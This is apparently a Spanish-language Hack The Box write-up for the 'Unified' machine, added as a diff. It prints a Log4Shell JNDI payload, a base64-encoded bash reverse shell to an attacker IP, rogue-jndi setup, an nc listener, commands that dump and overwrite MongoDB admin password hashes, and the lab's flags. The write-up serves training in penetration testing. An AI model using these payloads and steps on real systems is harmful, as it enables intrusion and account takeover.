@@ -1,0 +1,182 @@
+╔══════════════════════════════════════════════════════════════════╗
+║                        HTB - Unified                            ║
+║                       OS: Linux (Ubuntu)                        ║
+║                      IP: 10.129.96.149                          ║
+╚══════════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 1 — ESCANEO DE PUERTOS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  22/tcp    SSH     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+  6789/tcp  ?       ibm-db2-admin (por identificar)
+  8080/tcp  HTTP    Apache Tomcat — redirige a https://IP:8443/manage
+  8443/tcp  HTTPS   UniFi Network (login panel)
+                    commonName=UniFi / Ubiquiti Inc.
+  8843/tcp  HTTPS   Apache Tomcat
+  8880/tcp  HTTP    Apache Tomcat
+
+  → Como es SSL, se accede por https + puerto 8443
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 2 — ENUMERACION WEB
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Se encuentra un login de UniFi Network en https://10.129.96.149:8443/manage
+  Se buscan vulnerabilidades para esta version → CVE-2021-44228 (Log4Shell)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 3 — ACCESO INICIAL (CVE-2021-44228 — Log4Shell)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Log4Shell es una vulnerabilidad de inyeccion JNDI que permite RCE.
+  Al incluir datos no confiables en un mensaje registrado por Log4j,
+  el atacante fuerza una conexion JNDI a un servidor malicioso.
+  Soporta: DNS, LDAP, RMI, IIOP — puede llevar a coinmining, DoS, ransomware.
+
+  [1] Abrir BurpSuite con proxy activo
+
+  [2] Ir a: https://10.129.96.149:8443/manage/.../login
+      Intentar login con cualquier usuario/contraseña
+      Capturar el POST con BurpSuite → mandar a Repeater (Ctrl+R)
+
+  [3] Verificar que el servidor responde al LDAP — escuchar en tun0:
+
+        sudo tcpdump -i tun0 port 389
+
+  [4] En Repeater, reemplazar el campo "remember" con el payload:
+
+        "remember":"${jndi:ldap://10.10.14.141/attacker.com}",
+
+      Enviar → si hay conexion entrante en tcpdump, el servidor es vulnerable:
+
+        IP 10.129.96.149.32838 > Nitblan.ldap: Flags [S] ...
+
+  → Confirmado: LDAP interceptado, servidor vulnerable a Log4Shell
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 4 — PREPARAR ROGUE-JNDI
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Instalar dependencias:
+
+    # Arch Linux:
+    sudo pacman -S jdk11-openjdk
+    sudo pacman -S maven
+
+    # Debian/Ubuntu:
+    sudo apt install openjdk-11-jdk -y
+    sudo apt-get install maven -y
+
+  Clonar y compilar rogue-jndi:
+
+    git clone https://github.com/veracode-research/rogue-jndi
+    cd rogue-jndi
+    mvn package
+
+  Generar payload en base64 (reverse shell):
+
+    echo 'bash -c bash -i >&/dev/tcp/10.10.14.141/4444 0>&1' | base64
+    → YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQxOjQ0NDQgMD4mMQo=
+
+    NOTA: Si las comillas simples dan error, usar comillas dobles.
+
+  Levantar el servidor JNDI malicioso:
+
+    java -jar target/RogueJndi-1.1.jar \
+      --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQxLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" \
+      --hostname "10.10.14.141"
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 5 — REVERSE SHELL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Poner listener antes de disparar:
+
+    nc -lvnp 4444
+
+  En BurpSuite Repeater, cambiar "remember" al payload tomcat:
+
+    "remember":"${jndi:ldap://10.10.14.141:1389/o=tomcat}",
+
+  Enviar → shell como unifi recibida.
+
+  Upgradear la shell:
+
+    script /dev/null -c bash
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 6 — USER FLAG
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    cd /home/michael
+    cat user.txt
+
+  ► 6ced1a6a89e666c0620cdb10262ba127
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 7 — ESCALADA DE PRIVILEGIOS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Buscar MongoDB corriendo localmente:
+
+    ps aux | grep mongo
+    → mongod corriendo en puerto 27117
+
+  Conectarse y volcar los usuarios admin:
+
+    mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+  Se encuentran hashes SHA-512 de varios usuarios, incluyendo "administrator".
+  En vez de crackear el hash, se reemplaza por uno conocido.
+
+  Generar nuevo hash con contraseña simple:
+
+    mkpasswd -m sha-512 Password1234
+    → $6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX...
+
+  Actualizar el hash de administrator en MongoDB:
+
+    mongo --port 27117 ace --eval \
+      'db.admin.update(
+        {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
+        {$set:{"x_shadow":"$6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX.YI4txlQMixZa2yUW7FdduhHTVoYyJRajJ.Gw9AJ3KIJC5S/"}}
+      )'
+
+    → WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+
+  Hacer login en el panel UniFi como administrator / Password1234.
+  Explorar el sitio → en la configuracion del site se encuentra la contraseña de root:
+
+    root / NotACrackablePassword4U2022
+
+  Conectarse por SSH:
+
+    ssh root@10.129.96.149
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PASO 8 — ROOT FLAG
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    cat /root/root.txt
+
+  ► e50bc93c75b634e4b272d2f771c33681
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FLAGS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  User flag:  6ced1a6a89e666c0620cdb10262ba127
+  Root flag:  e50bc93c75b634e4b272d2f771c33681
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  PWNED :)
